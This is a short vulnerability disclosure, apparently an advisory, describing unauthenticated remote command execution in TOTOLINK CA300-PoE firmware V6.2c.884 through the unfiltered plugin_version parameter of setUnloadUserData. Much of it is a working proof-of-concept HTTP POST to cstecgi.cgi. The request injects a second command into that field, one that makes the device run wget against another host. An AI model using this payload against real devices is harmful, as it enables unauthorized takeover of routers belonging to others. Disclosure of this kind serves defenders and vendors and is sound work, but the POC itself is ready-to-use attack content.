## RCE-TOTOLINK CA300-PoE_Firmware  V6.2c.884
## Firmware

https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/139/ids/36.html
![image](https://github.com/user-attachments/assets/1f19d9d6-bbe6-409f-8085-a650f1d3f616)
## Description
```
TOTOLINK CA300-PoE_Firmware  V6.2c.884 was found to contain unauthorized remote command execution via the plugin_version parameter.
The plugin_version in the setUnloadUserData function in the update.so file is user-controllable. Without any filtering, it is spliced into the variable v8, and finally passed into cs_cmd, causing the command to be executed.
```

![image](https://github.com/user-attachments/assets/6b9416f3-f2dc-42f7-9a01-b0506bbc286b)
![94929ab1de737d7e19968cd6acdbdb6](https://github.com/user-attachments/assets/5c0ea937-4248-483c-b127-ac30462fea52)


![image](https://github.com/user-attachments/assets/4bb5278b-cb59-467b-bf9b-6116a30c0f02)
## POC
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1

Host: 192.168.0.254

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 107

Origin: http://192.168.0.254

Connection: keep-alive

Referer: http://192.168.0.254/adm/network_daig.asp?timestamp=1673492576260



{"topicurl" :"setting/setUnloadUserData",

"plugin_version" : "a;wget http://192.168.0.253:8000/123.txt;a"}
```
